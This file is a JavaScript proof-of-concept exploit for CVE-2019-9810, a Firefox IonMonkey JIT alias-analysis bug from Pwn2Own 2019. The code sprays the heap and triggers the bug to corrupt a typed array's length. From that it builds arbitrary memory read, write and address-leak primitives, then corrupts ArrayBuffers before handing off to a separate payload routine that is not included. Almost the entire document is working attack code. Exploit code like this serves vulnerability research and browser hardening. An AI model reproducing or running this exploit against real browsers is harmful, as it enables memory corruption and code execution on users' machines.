// Axel '0vercl0k' Souchet - 27 April 2019
// CVE-2019-9810 - IonMonkey MArraySlice incorrect alias information
// The issue has been found by Amat Cama and Richard Zhu for compromising Mozilla Firefox
// during Pwn2Own2019.
//

const Debug = false;
const dbg = p => {
    if(Debug == false) {
        return;
    }

    print('Debug: ' + p);
};

const ArraySize = 0x5;
const WantedArraySize = 0x42424242;

let arr = null;
let Trigger = false;
const Spray = [];

function f(Special, Idx, Value) {
    arr[Idx] = 0x41414141;
    Special.slice();
    arr[Idx] = Value;
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if(!Trigger) {
                return;
            }

            arr.length = 0;
            for(let i = 0; i < 0x40000; i++) {
                Spray.push(new Uint32Array(ArraySize));
            }
        };
    }
};

function get_me_biggie() {
    for(let Idx = 0; Idx < 0x1000; Idx++) {
        Spray.push(new Uint32Array(ArraySize));
    }

    const SpecialSnowFlake = new SoSpecial();
    for(let Idx = 0; Idx < 10; Idx++) {
        arr = new Array(0x7e);
        Trigger = false;
        for(let Idx = 0; Idx < 0x400; Idx++) {
            f(SpecialSnowFlake, 0x70, Idx);
        }

        Trigger = true;
        f(SpecialSnowFlake, 47, WantedArraySize);
        if(arr.length != 0) {
            continue;
        }

        const Biggie = Spray.find(e => e.length != ArraySize);
        if(Biggie != null) {
            return Biggie;
        }
    }

    return null;
}

BigInt.fromBytes = Bytes => {
    let Int = BigInt(0);
    for(const Byte of Bytes.reverse()) {
        Int = (Int << 8n) | BigInt(Byte);
    }
    return Int;
};

BigInt.toBytes = Addr => {
    let Remainder = Addr;
    const Bytes = [];
    while(Remainder != 0) {
        const Low = Remainder & 0xffn;
        Remainder = Remainder >> 8n;
        Bytes.push(Number(Low));
    }

    //
    // Pad it if we need to do so.
    //

    if(Bytes.length < 8) {
        while(Bytes.length != 8) {
            Bytes.push(0);
        }
    }

    return Bytes;
};

BigInt.fromUint32s = Uint32s => {
    let Int = BigInt(0);
    for(const Uint32 of Uint32s.reverse()) {
        Int = (Int << 32n) | BigInt(Uint32);
    }
    return Int;
};

BigInt.fromJSValue = Addr => {
    return Addr & 0x0000ffffffffffffn;
};

function main(LoadedFromBrowser) {
    if(LoadedFromBrowser) {
        print = p => {
            console.log(p);
        };
    }

    const Biggie = get_me_biggie();
    if(Biggie == null || Biggie.length != WantedArraySize) {
        dbg('Failed :-(, reloading..');
        location.reload();
        return;
    }

    //
    // Scan for one of the Uint32Array we sprayed earlier.
    //

    let Biggie2AdjacentSize = null;
    const JSValueArraySize = 0xfffa000000000000n | BigInt(ArraySize);
    for(let Idx = 0; Idx < 0x100; Idx++) {
        const Qword = BigInt(Biggie[Idx]) << 32n | BigInt(Biggie[Idx + 1]);
        if(Qword == JSValueArraySize) {
            Biggie2AdjacentSize = Idx + 1;
            break;
        }
    }

    if(Biggie2AdjacentSize == null) {
        dbg('Failed to find an adjacent array :(.');
        return;
    }

    //
    // Use the array length as a marker.
    //

    const AdjacentArraySize = 0xbbccdd;
    Biggie[Biggie2AdjacentSize] = AdjacentArraySize;

    //
    // Find the array now..
    //

    const AdjacentArray = Spray.find(
        e => e.length == AdjacentArraySize
    );

    if(AdjacentArray == null) {
        dbg('Failed to find the corrupted adjacent array :(.');
        return;
    }

    const Read64 = Addr => {
        const SizeInDwords = 2;
        Biggie[Biggie2AdjacentSize] = SizeInDwords;
        Biggie[Biggie2AdjacentSize + 2 + 2] = Number(Addr & 0xffffffffn);
        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = Number(Addr >> 32n);
        return BigInt.fromUint32s([AdjacentArray[0], AdjacentArray[1]]);
    };

    const Write64 = (Addr, Value) => {
        const SizeInDwords = 2;
        Biggie[Biggie2AdjacentSize] = SizeInDwords;
        Biggie[Biggie2AdjacentSize + 2 + 2] = Number(Addr & 0xffffffffn);
        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = Number(Addr >> 32n);
        AdjacentArray[0] = Number(Value & 0xffffffffn);
        AdjacentArray[1] = Number(Value >> 32n);
        return true;
    };

    const AddrOf = Obj => {
        AdjacentArray.hell_on_earth = Obj;
        // 0:000> dqs 1ae5716e76a0
        // 00001ae5`716e76a0  00001ae5`7167dfd0
        // 00001ae5`716e76a8  000010c5`8e73c6a0
        // 00001ae5`716e76b0  00000238`9334e790
        // 00001ae5`716e76b8  00007ff6`6be55010 js!emptyElementsHeader+0x10
        // 00001ae5`716e76c0  fffa0000`00000000
        // 00001ae5`716e76c8  fff88000`00bbccdd
        // 0:000> !telescope 0x00002389334e790
        // 0x000002389334e790|+0x0000: 0xfffe1ae5716e7640 (Unknown)
        const SlotOffset = Biggie2AdjacentSize - (3 * 2);
        const SlotsAddress = BigInt.fromUint32s(
            Biggie.slice(SlotOffset, SlotOffset + 2)
        );
        return BigInt.fromJSValue(Read64(SlotsAddress));
    };

    //
    // Let's move the battle field to the TenuredHeap
    //

    const AB1 = new ArrayBuffer(10);
    const AB2 = new ArrayBuffer(10);
    const AB1Address = AddrOf(AB1);
    const AB2Address = AddrOf(AB2);

    dbg('AddrOf(AB1): ' + AB1Address.toString(16));
    dbg('AddrOf(AB2): ' + AB2Address.toString(16));
    Write64(AB1Address + 0x28n, 0xfff8800000010000n);
    Write64(AB2Address + 0x28n, 0xfff8800000010000n);

    if(AB1.byteLength != AB2.byteLength && AB1.byteLength != 0x10000) {
        dbg('Corrupting the ArrayBuffers failed :(.');
        return;
    }

    //
    // From there, we're kinda done - just reusing a bunch of stuff I have already
    // wrote for blazefox.
    //

    if(!LoadedFromBrowser) {
        load('payload.js');
        load('toolbox.js');
    }

    Pwn(AB1, AB2);
}

try {
    document;
} catch(e) {
    main(false);
}
